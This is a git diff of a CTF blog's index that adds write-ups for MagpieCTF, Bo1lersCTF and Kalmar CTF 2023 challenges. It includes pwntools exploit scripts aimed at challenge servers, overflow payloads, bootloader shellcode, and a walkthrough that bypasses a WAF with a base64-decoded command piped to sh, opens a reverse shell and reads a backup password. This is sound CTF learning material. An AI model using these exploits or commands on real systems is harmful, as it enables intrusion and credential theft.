-    <content><![CDATA[<h1 id="Kalmar-CTF-2023"><a href="#Kalmar-CTF-2023" class="headerlink" title="Kalmar CTF 2023"></a>Kalmar CTF 2023</h1><p><a href="https://ctftime.org/event/1878/">https://ctftime.org/event/1878/</a></p>
-<h1 id="Rank"><a href="#Rank" class="headerlink" title="Rank"></a>Rank</h1><p>16th place (<a href="https://ctftime.org/team/73723">MapleBacon</a>)</p>
-<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
-<li><a href="./pwn/js-in-my-bs">[pwn] js-in-my-bs</a></li>
-<li><a href="./pwn/mjs">[pwn] mjs</a></li>
-</ul>
-]]></content>
-  </entry>
-  <entry>
-    <title>LACTF 2023</title>
-    <url>/ctf-writeup/2023/lactf/index.html</url>
-    <content><![CDATA[<h1 id="LA-CTF-2023"><a href="#LA-CTF-2023" class="headerlink" title="LA CTF 2023"></a>LA CTF 2023</h1><p><a href="https://platform.lac.tf/">https://platform.lac.tf/</a></p>
-<h1 id="Rank"><a href="#Rank" class="headerlink" title="Rank"></a>Rank</h1><p>7 th place (<a href="https://ctftime.org/team/73723">MapleBacon</a>)</p>
-<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
-<li>[[pwn] bot]</li>
-<li>[[pwn] rickroll]</li>
-<li>[[pwn] rut-roh-relro]</li>
-</ul>
-]]></content>
-  </entry>
-  <entry>
-    <title>MagpieCTF 2023</title>
-    <url>/ctf-writeup/2023/magpiectf/index.html</url>
-    <content><![CDATA[<h1 id="MagpieCTF-2023"><a href="#MagpieCTF-2023" class="headerlink" title="MagpieCTF 2023"></a>MagpieCTF 2023</h1><p><a href="https://github.com/infosec-ucalgary/magpieCTF-2023">https://github.com/infosec-ucalgary/magpieCTF-2023</a></p>
-<h1 id="Rank"><a href="#Rank" class="headerlink" title="Rank"></a>Rank</h1><p>5 th place (<a href="https://ctftime.org/team/73723">MapleBacon</a>)</p>
-<h1 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h1><p>this ctf is literally a guessing game.</p>
-<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
-<li><a href="./writeup">writeup</a></li>
-</ul>
-]]></content>
-  </entry>
-  <entry>
-    <title>PicoCTF 2023</title>
-    <url>/ctf-writeup/2023/picoctf/index.html</url>
-    <content><![CDATA[<h1 id="PicoCTF-2023"><a href="#PicoCTF-2023" class="headerlink" title="PicoCTF 2023"></a>PicoCTF 2023</h1><p><a href="https://play.picoctf.org/">https://play.picoctf.org/</a></p>
-<p><strong>pwn full clear</strong></p>
-<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
-<li>todo</li>
-</ul>
+    <title>MagpieCTF 2023 Writeup</title>
+    <url>/ctf-writeup/2023/magpiectf/writeup/index.html</url>
+    <content><![CDATA[<h1 id="0x0-Before-all"><a href="#0x0-Before-all" class="headerlink" title="0x0 Before all"></a>0x0 Before all</h1><p>I don&#39;t like this ctf. And most of challenge is not worth to craft a writeup.</p>
+<p>all files can be found in <a href="https://github.com/infosec-ucalgary/magpieCTF-2023">https://github.com/infosec-ucalgary/magpieCTF-2023</a></p>
+<h1 id="0x1-PWN-no-password-here"><a href="#0x1-PWN-no-password-here" class="headerlink" title="0x1 [PWN] no-password-here"></a>0x1 [PWN] no-password-here</h1><p><a href="https://github.com/infosec-ucalgary/magpieCTF-2023/tree/main/challenges/binary-exploitation/no-password-here">files</a></p>
+<p><code>scanf(&quot;%s&quot;)</code> buffer overflow</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char Test[20];</span><br><span class="line">... </span><br><span class="line">char input[20];</span><br><span class="line">...</span><br><span class="line">//Check password</span><br><span class="line">if (strncmp(Test,input,20) == 0)</span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure>
+
+<p>payload: <code>&#39;A&#39;*40</code></p>
+<p>flag: <code>magpie&#123;5c4nf_n07_54f3&#125;</code></p>
+<h1 id="0x2-PWN-no-password-here"><a href="#0x2-PWN-no-password-here" class="headerlink" title="0x2 [PWN] no-password-here"></a>0x2 [PWN] no-password-here</h1><p><a href="https://github.com/infosec-ucalgary/magpieCTF-2023/tree/main/challenges/binary-exploitation/this-outta-be-large-enough-right">files</a></p>
+<p>ret2win. fill stack with 56 + 4 padding. then overwrite eip</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void win()&#123;</span><br><span class="line">    printf(&quot;Here is your flag:\n&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">&#125;</span><br><span class="line">void vuln()&#123;</span><br><span class="line">  char buf[56];</span><br><span class="line">  gets(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>flag: <code>magpie&#123;0mn1_fl4g_3v3rywh3r3&#125;</code></p>
+<h1 id="0x3-Web-education-comes-first"><a href="#0x3-Web-education-comes-first" class="headerlink" title="0x3 [Web] education-comes-first"></a>0x3 [Web] education-comes-first</h1><p><a href="https://github.com/infosec-ucalgary/magpieCTF-2023/tree/main/challenges/web-exploitation/education-comes-first">files</a></p>
+<p>call <code>hex2a</code> in web console</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hex2a(&#x27;6d61677069657b57335f525f5337314c4c5f483352337d&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>flag: <code>magpie&#123;W3_R_S71LL_H3R3&#125;</code></p>
+<h1 id="0x4-Forensic-there-is-no-flag"><a href="#0x4-Forensic-there-is-no-flag" class="headerlink" title="0x4 [Forensic] there-is-no-flag"></a>0x4 [Forensic] there-is-no-flag</h1><p><a href="https://github.com/infosec-ucalgary/magpieCTF-2023/tree/main/challenges/forensics/there-is-no-flag">files</a></p>
+<ol>
+<li>binwalk to extract Flag.PNG</li>
+<li>recover modify png header</li>
+<li>read flag</li>
+</ol>
+<p>flag: <code>magpie&#123;m15510n_c0mpl373_w17h_r35p3c7&#125;</code></p>
+<h1 id="0x5-Network-eavesdropper"><a href="#0x5-Network-eavesdropper" class="headerlink" title="0x5 [Network] eavesdropper"></a>0x5 [Network] eavesdropper</h1><p><a href="https://github.com/infosec-ucalgary/magpieCTF-2023/tree/main/challenges/networks/eavesdropper">files</a></p>
+<ol>
+<li>open .pcapng file</li>
+<li>find http request with largest request body, flag is in the http body</li>
+</ol>
+<p>flag: <code>magpie&#123;chOc0LatE_Ch1p_c0Ok1e5&#125;</code></p>
+<h1 id="0x5-Network-knock-knock-anyone-there"><a href="#0x5-Network-knock-knock-anyone-there" class="headerlink" title="0x5 [Network] knock-knock-anyone-there"></a>0x5 [Network] knock-knock-anyone-there</h1><ol>
+<li>bypass waf using <code>printf cmd_in_base_64 | base64 -d | sh</code></li>
+<li>setting up reverse shell</li>
+<li>find password of user sappheiros using <code>cat /opt/backup/*</code> (<code>5up32_53cu23_p455w02d123</code>)</li>
+<li><code>su sappheiros</code></li>
+<li>first half flag is in <code>cat /home/sappheiros/message.txt</code></li>
+<li><code>tcpdump -nnA host 172.16.238.30</code></li>
+<li>second half flag is hidden inside ids of icmp packets.</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">pcap = rdpcap(&#x27;dump.pcap&#x27;)</span><br><span class="line"></span><br><span class="line">data = [p[ICMP] for p in pcap if ICMP in p]</span><br><span class="line"></span><br><span class="line">print(b&#x27;&#x27;.join([bytes([d.id]) for d in data]).split(b&#x27;&#125;&#x27;))</span><br></pre></td></tr></table></figure>
+
+<p>flag: <code>magpie&#123;y0u_h4v3_7h3_p0w32_70_54v3_7h3_w021d&#125;</code></p>
 ]]></content>
   </entry>
   <entry>
@@ -4958,51 +4983,167 @@ https://www.bsfdvbsbilibili.com
 <h1 id="0x3-Solution"><a href="#0x3-Solution" class="headerlink" title="0x3 Solution"></a>0x3 Solution</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">&quot;chall&quot;</span>)</span><br><span class="line">exe_rop = ROP(exe)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;libc.so.6&quot;)</span></span><br><span class="line"><span class="comment"># ld = ELF(&quot;./ld-2.27.so&quot;)</span></span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log_print</span>(<span class="params">*msg</span>):</span><br><span class="line">    log.info(<span class="string">&quot; &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,msg)))</span><br><span class="line">lp = log_print</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        <span class="keyword">if</span> args.R2:</span><br><span class="line">            <span class="built_in">input</span>(<span class="string">&quot;Wait r2 attach&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">&quot;pwn1.2022.cakectf.com&quot;</span>, <span class="number">9003</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;str: &quot;</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;c_str: &quot;</span>,flat(&#123;</span><br><span class="line">    <span class="number">0x20</span>:<span class="number">0x00404028</span></span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;str: &quot;</span>,<span class="string">b&#x27;\xde\x16\x40\x00\x00\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;str: &quot;</span>,flat(&#123;</span><br><span class="line">    <span class="number">0x20</span>: <span class="number">0x0404a00</span>,</span><br><span class="line">    <span class="number">0x28</span>: <span class="number">8</span>,</span><br><span class="line">    <span class="number">0x40</span>:<span class="number">0</span></span><br><span class="line">&#125;,length=<span class="number">0x50</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;str: &quot;</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
   </entry>
   <entry>
-    <title>MagpieCTF 2023 Writeup</title>
-    <url>/ctf-writeup/2023/magpiectf/writeup/index.html</url>
-    <content><![CDATA[<h1 id="0x0-Before-all"><a href="#0x0-Before-all" class="headerlink" title="0x0 Before all"></a>0x0 Before all</h1><p>I don&#39;t like this ctf. And most of challenge is not worth to craft a writeup.</p>
-<p>all files can be found in <a href="https://github.com/infosec-ucalgary/magpieCTF-2023">https://github.com/infosec-ucalgary/magpieCTF-2023</a></p>
-<h1 id="0x1-PWN-no-password-here"><a href="#0x1-PWN-no-password-here" class="headerlink" title="0x1 [PWN] no-password-here"></a>0x1 [PWN] no-password-here</h1><p><a href="https://github.com/infosec-ucalgary/magpieCTF-2023/tree/main/challenges/binary-exploitation/no-password-here">files</a></p>
-<p><code>scanf(&quot;%s&quot;)</code> buffer overflow</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char Test[20];</span><br><span class="line">... </span><br><span class="line">char input[20];</span><br><span class="line">...</span><br><span class="line">//Check password</span><br><span class="line">if (strncmp(Test,input,20) == 0)</span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure>
+    <title>[Pwn] cfifufuuufuuuuu [Bo1lersCTF 2023]</title>
+    <url>/ctf-writeup/2023/bo1lersctf/pwn/cfifufuuufuuuuu/index.html</url>
+    <content><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>A tiny program, protected by some Python code. The flag is in: .&#x2F;flag.txt</p>
+<p><a href="https://github.com/b01lers/b01lers-ctf-2023-public/tree/main/pwn/cfifufuuufuuuuu">files</a></p>
+<h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
 
-<p>payload: <code>&#39;A&#39;*40</code></p>
-<p>flag: <code>magpie&#123;5c4nf_n07_54f3&#125;</code></p>
-<h1 id="0x2-PWN-no-password-here"><a href="#0x2-PWN-no-password-here" class="headerlink" title="0x2 [PWN] no-password-here"></a>0x2 [PWN] no-password-here</h1><p><a href="https://github.com/infosec-ucalgary/magpieCTF-2023/tree/main/challenges/binary-exploitation/this-outta-be-large-enough-right">files</a></p>
-<p>ret2win. fill stack with 56 + 4 padding. then overwrite eip</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void win()&#123;</span><br><span class="line">    printf(&quot;Here is your flag:\n&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">&#125;</span><br><span class="line">void vuln()&#123;</span><br><span class="line">  char buf[56];</span><br><span class="line">  gets(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>flag: <code>magpie&#123;0mn1_fl4g_3v3rywh3r3&#125;</code></p>
-<h1 id="0x3-Web-education-comes-first"><a href="#0x3-Web-education-comes-first" class="headerlink" title="0x3 [Web] education-comes-first"></a>0x3 [Web] education-comes-first</h1><p><a href="https://github.com/infosec-ucalgary/magpieCTF-2023/tree/main/challenges/web-exploitation/education-comes-first">files</a></p>
-<p>call <code>hex2a</code> in web console</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hex2a(&#x27;6d61677069657b57335f525f5337314c4c5f483352337d&#x27;)</span><br></pre></td></tr></table></figure>
+<h2 id="loader"><a href="#loader" class="headerlink" title="loader"></a>loader</h2><p>my analysis database <a href="./s.bndb">s.bndb</a></p>
+<p>This binary is run by a python loaders. python loader is acting like a debugger.</p>
+<p>Everytime a breakpoint instruction (<code>0xcc</code>) being executed. python loader will check next byte after rip. And determine what to do next depend on that byte.</p>
+<p>for example, if next byte is <code>0x48</code>. it will replace some register</p>
+<p><img data-src="/2023-03-28_214738.png" alt="image"></p>
+<p>otherwise, if the next byte is equal to some other bytes. it will do a canary check manually</p>
+<p><img data-src="/2023-03-28_214958.png" alt="image"></p>
+<h2 id="vulnerability-1-canary-check-failed"><a href="#vulnerability-1-canary-check-failed" class="headerlink" title="vulnerability 1 - canary check failed"></a>vulnerability 1 - canary check failed</h2><p>it did have canary check. The canary values are actually saved return pointers. However, when comparing return pointers, it only check if return pointer exists in the stack. So, we can still modify the saved return pointer to the caller&#39;s saved return pointer.</p>
+<h2 id="vulnerability-2-overwriting"><a href="#vulnerability-2-overwriting" class="headerlink" title="vulnerability 2 - overwriting"></a>vulnerability 2 - overwriting</h2><p>Bascially, the binary contains 2 main function. <code>encrypt</code> and <code>decrypt</code></p>
+<p><code>decrypt</code> function calls a function which read all bytes until it meet a new line character (<code>\n</code>). This is a trivial buffer overflow we can use to modify return pointer.</p>
+<p>using this vulnerability with the previous one, we can run <code>main</code> function again.</p>
+<p>since <code>_start</code> function is essentially a loop if return value of <code>main</code> is not equal to 1</p>
+<p><img data-src="/2023-03-28_220216.png" alt="image"></p>
+<h2 id="vulnerability-3-random-generation"><a href="#vulnerability-3-random-generation" class="headerlink" title="vulnerability 3 - random generation"></a>vulnerability 3 - random generation</h2><p>encrypt function generating random values by reading <code>/dev/urandom</code>. And store using input is .bss section.</p>
+<p>it also use a global variable to record index of the data array. everytime we call <code>encrypt</code>, the index will increase by one.</p>
+<p><img data-src="/2023-03-28_215944.png" alt="image"></p>
+<p>normally it&#39;s okay, because we are only executing <code>encrypt</code> function once.</p>
+<p>however, since we can run <code>encrypt</code> function multiple time. we increase the index value until we overwrite <code>/dev/urandom</code> string.</p>
+<h2 id="conclusion"><a href="#conclusion" class="headerlink" title="conclusion"></a>conclusion</h2><p>we overwrite <code>/dev/urandom</code>, and the program will print out the flag for us!</p>
+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">exe = ELF(&quot;s&quot;)</span><br><span class="line"># exe_rop = ROP(exe)</span><br><span class="line"># libc = ELF(&quot;libc.so.6&quot;)</span><br><span class="line"># ld = ELF(&quot;./ld-2.27.so&quot;)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"># context.log_level = &#x27;DEBUG&#x27;</span><br><span class="line"></span><br><span class="line">def wait(*msg):</span><br><span class="line">    if args.WAIT:</span><br><span class="line">        input(&quot; &quot;.join(map(str,msg)))</span><br><span class="line"></span><br><span class="line">def log_print(*msg):</span><br><span class="line">    log.info(&quot; &quot;.join(map(str,msg)))</span><br><span class="line">lp = log_print</span><br><span class="line">def start():</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        r = process([&quot;python&quot;,&quot;./loader.py&quot;])</span><br><span class="line">        r.recvuntil(b&quot;pid=&quot;)</span><br><span class="line">        pid = int(r.recvuntil(b&quot;;\n&quot;,drop=True))</span><br><span class="line">        print(&quot;pid of the binary is %d&quot; % pid)</span><br><span class="line">        if args.R2:</span><br><span class="line">            util.proc.wait_for_debugger(pid)</span><br><span class="line">    else:</span><br><span class="line">        r = remote(&quot;ctf.b01lers.com&quot;, 5215)</span><br><span class="line">    return r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">flagstring = b&quot;flag.txt&quot;.ljust(0x10,b&quot;\x00&quot;)</span><br><span class="line">nonesense = b&#x27;\x00&#x27;*0x10</span><br><span class="line">payload = flat(&#123;</span><br><span class="line">    0x0: b&#x27;\x00&#x27;*0x10, # make all 0, easier for xor</span><br><span class="line">    0x38:[</span><br><span class="line">        0x00004005e2, # _start if eax=1, call main again </span><br><span class="line">    ]</span><br><span class="line">&#125;)+b&#x27;\n&#x27;</span><br><span class="line"># filled up data</span><br><span class="line">for i in range(8):</span><br><span class="line">    io.sendafter(b&quot;Your data to encrypt?:\n&quot;,flagstring)</span><br><span class="line">    io.sendafter(b&quot;Your data to decrypt?:\n&quot;,nonesense)</span><br><span class="line">    io.sendafter(b&quot;Your key?:\n&quot;,payload)</span><br><span class="line"># overflow /dev/urandom</span><br><span class="line">io.sendafter(b&quot;Your data to encrypt?:\n&quot;,flagstring)</span><br><span class="line">io.recvuntil(b&quot;Your key:\n&quot;)</span><br><span class="line">lp(&quot;flag: &quot;, io.recvuntil(b&quot;\n&quot;,drop=True))</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
+]]></content>
+  </entry>
+  <entry>
+    <title>[Pwn] js-in-my-bs [Kalmar CTF 2023]</title>
+    <url>/ctf-writeup/2023/kalmar/pwn/js-in-my-bs/index.html</url>
+    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Description: TDB</p>
+<p>Files: TBD</p>
+<h1 id="0x1-Playing-around-with-their-JS-engine"><a href="#0x1-Playing-around-with-their-JS-engine" class="headerlink" title="0x1 Playing around with their JS engine"></a>0x1 Playing around with their JS engine</h1><p>Challenge runs under a i386 environment using a simulator (qemu)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./qemu-system-i386 -L /bios -display none -drive format=raw,file=&quot;./bootjs.bin&quot; -serial stdio</span><br></pre></td></tr></table></figure>
 
-<p>flag: <code>magpie&#123;W3_R_S71LL_H3R3&#125;</code></p>
-<h1 id="0x4-Forensic-there-is-no-flag"><a href="#0x4-Forensic-there-is-no-flag" class="headerlink" title="0x4 [Forensic] there-is-no-flag"></a>0x4 [Forensic] there-is-no-flag</h1><p><a href="https://github.com/infosec-ucalgary/magpieCTF-2023/tree/main/challenges/forensics/there-is-no-flag">files</a></p>
+<p>qemu simulator will load boot section in bootjs.bin and spawn a javascript console(?).</p>
+<p>In this javascript console, I was able to executing some basic command such as simple math operation, print(function calling), and variable assignment.</p>
+<p><img data-src="/2023-03-05_220531.png" alt="2023-03-05_220531.png"></p>
+<p>However, I found certain limitation when playing with this simulator</p>
 <ol>
-<li>binwalk to extract Flag.PNG</li>
-<li>recover modify png header</li>
-<li>read flag</li>
+<li>variable name can only be an one byte character, (eg <code>a</code>,<code>b</code>)</li>
+<li>math operation only support number from 0-9 (also single byte)</li>
 </ol>
-<p>flag: <code>magpie&#123;m15510n_c0mpl373_w17h_r35p3c7&#125;</code></p>
-<h1 id="0x5-Network-eavesdropper"><a href="#0x5-Network-eavesdropper" class="headerlink" title="0x5 [Network] eavesdropper"></a>0x5 [Network] eavesdropper</h1><p><a href="https://github.com/infosec-ucalgary/magpieCTF-2023/tree/main/challenges/networks/eavesdropper">files</a></p>
-<ol>
-<li>open .pcapng file</li>
-<li>find http request with largest request body, flag is in the http body</li>
-</ol>
-<p>flag: <code>magpie&#123;chOc0LatE_Ch1p_c0Ok1e5&#125;</code></p>
-<h1 id="0x5-Network-knock-knock-anyone-there"><a href="#0x5-Network-knock-knock-anyone-there" class="headerlink" title="0x5 [Network] knock-knock-anyone-there"></a>0x5 [Network] knock-knock-anyone-there</h1><ol>
-<li>bypass waf using <code>printf cmd_in_base_64 | base64 -d | sh</code></li>
-<li>setting up reverse shell</li>
-<li>find password of user sappheiros using <code>cat /opt/backup/*</code> (<code>5up32_53cu23_p455w02d123</code>)</li>
-<li><code>su sappheiros</code></li>
-<li>first half flag is in <code>cat /home/sappheiros/message.txt</code></li>
-<li><code>tcpdump -nnA host 172.16.238.30</code></li>
-<li>second half flag is hidden inside ids of icmp packets.</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">pcap = rdpcap(&#x27;dump.pcap&#x27;)</span><br><span class="line"></span><br><span class="line">data = [p[ICMP] for p in pcap if ICMP in p]</span><br><span class="line"></span><br><span class="line">print(b&#x27;&#x27;.join([bytes([d.id]) for d in data]).split(b&#x27;&#125;&#x27;))</span><br></pre></td></tr></table></figure>
+<p>OK, then where is the flag. Lets take look at bootjs.bin</p>
+<h1 id="0x2-Preparation"><a href="#0x2-Preparation" class="headerlink" title="0x2 Preparation"></a>0x2 Preparation</h1><p>Before starting reversing, I first did some research about i386 boot loader. (see reference section)</p>
+<p>boot loader is loaded after bios. and bios will load first sector of  boot loader (<strong>512 bytes</strong>) to a fixed address in memory (0x7c00). </p>
+<p><img data-src="/2023-03-05_221209.png" alt="2023-03-05_221209.png"></p>
+<p>Boot loader is usually written in 16-bit assembly. executing in cpu real mode. </p>
+<p>The main task for boot loader is to load kernel into memory. Then, kernel will deal with everything else after that. (Which is not the case for this challenge, the boot loader for this challenge is a js engine)</p>
+<h1 id="0x3-Reversing-Analyzing"><a href="#0x3-Reversing-Analyzing" class="headerlink" title="0x3 Reversing &amp; Analyzing"></a>0x3 Reversing &amp; Analyzing</h1><p>After loaded <code>bootjs.bin</code> in Binary Ninja. I found the placeholder flag instantaneously. flag bytes start at <code>0x7e00</code> after a MBR boot signature <code>55AA</code>. </p>
+<p>Above flag bytes, there is a huge chunk of suspicious <code>A</code>s. </p>
+<p><img data-src="/2023-03-05_222644.png" alt="2023-03-05_222644.png"></p>
+<p>We know that bios only load first sector of boot loader into memory, flag bytes was clearly not in the memory (0x7e00-0x7c00 &#x3D; 0x200 &#x3D; 512).</p>
+<p>(Therefore, at some point, I have to executing some shellcode so that I could load flag bytes into the memory.)</p>
+<p>After took some time analyzing the binary file, I came up with those  functions</p>
+<p><img data-src="/2023-03-05_224254.png" alt="2023-03-05_224254.png"></p>
+<p><code>print_byte</code>: print one byte as ascii to screen.</p>
+<p><code>print_crlf</code>: print CRLF to screen <code>\r\n</code> </p>
+<p><code>print_hex</code>: print 4 bit as hex.</p>
+<p><img data-src="/2023-03-05_224037.png" alt="2023-03-05_224037.png"></p>
+<p><code>read_input</code>: read one byte from user input and print it back to screen</p>
+<p><img data-src="/2023-03-05_224658.png" alt="2023-03-05_224658.png"></p>
+<p><code>math_op</code>: perform math operation recursively</p>
+<p><img data-src="/2023-03-05_224909.png" alt="2023-03-05_224909.png"></p>
+<p><code>input_to_num</code>: ask one byte from user input. </p>
+<p>If user input is a number then return the number itself (<code>sub al, 0x30</code>). </p>
+<p>Otherwise, it is a variable. So, it will get the value of that variable using <code>var_to_num</code>(actually set si to the data offset) and return the value.</p>
+<p><img data-src="/2023-03-05_225041.png" alt="2023-03-05_225041.png"></p>
+<p><code>entry</code>: main loop</p>
+<p>if second byte is <code>=</code>, it will perform variable assignment <code>mov word ptr [si], bx</code>. </p>
+<p>If second byte is a <code>(</code>, it will regard first byte as a fucntion name. and call this function. <code>call word ptr [si]</code></p>
+<p><img data-src="/2023-03-05_225456.png" alt="2023-03-05_225456.png"></p>
+<p><code>log_print</code>: print two bytes as hex</p>
+<p><img data-src="/2023-03-05_230553.png" alt="2023-03-05_230553.png"></p>
+<p><strong>Finally</strong>, the vulnerable funtion <code>var_to_num</code></p>
+<p>This function uses the suspicious chunk start from <code>0x7cda</code> as a <strong>variable table</strong></p>
+<p>This <strong>variable table</strong> store all existing variable name and value (or function name and address). Each variable entry (or function entry) occupy 3 bytes (1 byte name, 2 byte data).</p>
+<p>For example, the binary came with a built in function <code>l</code> (which print value in a variable as hex). </p>
+<p>So, in the variable table, <code>6c7a7c</code> represents this entry. Where <code>6c</code> is the function name <code>l</code>, <code>7a7c</code> is the function address of <code>log_print</code> in little endian (<code>0x7c7a</code>) </p>
+<p><img data-src="/2023-03-05_225921.png" alt="2023-03-05_225921.png"></p>
+<p>Also, register <code>cx</code> hold how many variables&#x2F;functions are in the variable table.</p>
+<p>Here is the pesudo code for <code>var_to_num</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func var_to_num(var_name):</span><br><span class="line">    si = variable_table = 0x7cda</span><br><span class="line">    idx = 0</span><br><span class="line">    while idx &lt; cx:</span><br><span class="line">        if var_name is the first byte in variable table:</span><br><span class="line">            si = si +1 // move si to data section</span><br><span class="line">            return</span><br><span class="line">        si = si +3 // move to next entry</span><br><span class="line">        idx ++</span><br><span class="line">    // if variable name not found in variable table</span><br><span class="line">    cx = cx + 1 // increase variable count</span><br><span class="line">    si[0] = var_name // set first byte to variable name</span><br><span class="line">    si = si + 1 // move si to data section</span><br><span class="line">    return </span><br></pre></td></tr></table></figure>
 
-<p>flag: <code>magpie&#123;y0u_h4v3_7h3_p0w32_70_54v3_7h3_w021d&#125;</code></p>
+<p>Here we go, I got a limited arbitrary write in an executable region!</p>
+<p>limitation: first bytes of every three bytes in shellcodes must be different</p>
+<p>Now I can write shellcode in this region and run the shellcode by calling a custom function.</p>
+<h1 id="0x4-crafting-shellcode"><a href="#0x4-crafting-shellcode" class="headerlink" title="0x4 crafting shellcode"></a>0x4 crafting shellcode</h1><p>Our shellcode need to do two thing: load second sector from drive into the memory; and print out the flag</p>
+<h2 id="print-out-flag"><a href="#print-out-flag" class="headerlink" title="print out flag:"></a>print out flag:</h2><ol>
+<li>setting up register</li>
+<li>using <code>lodsb</code> to load one byte to <code>al</code> and move <code>si</code> to next byte</li>
+<li>print out <code>al</code> using <code>out dx,al</code></li>
+<li>jump to step 2 again using <code>jmp</code></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    mov dx, 0x3f8              ; serial out</span><br><span class="line">    mov si, bx                 ; source buffer (start of flag)</span><br><span class="line">loop:</span><br><span class="line">    lodsb                      ; load byte from si into al, advance si</span><br><span class="line">    out dx, al                 ; send al to serial out</span><br><span class="line">    jmp loop                   ; repeat</span><br><span class="line">    nop</span><br></pre></td></tr></table></figure>
+
+<h2 id="load-second-sector-into-memory"><a href="#load-second-sector-into-memory" class="headerlink" title="load second sector into memory"></a>load second sector into memory</h2><p>This part is bit tricky, but I found a very good post about how to load second sector <a href="http://3zanders.co.uk/2017/10/18/writing-a-bootloader3/">http://3zanders.co.uk/2017/10/18/writing-a-bootloader3/</a>. </p>
+<p>So I just copy paste their assembly code and did some modification.</p>
+<p>something to be noted</p>
+<p><code>int 0x13</code> uses cylinder-head-sector (CHS) addressing. In CHS addressing, sector index start with <strong>1</strong> instead of <strong>0</strong> due to some historical reason.</p>
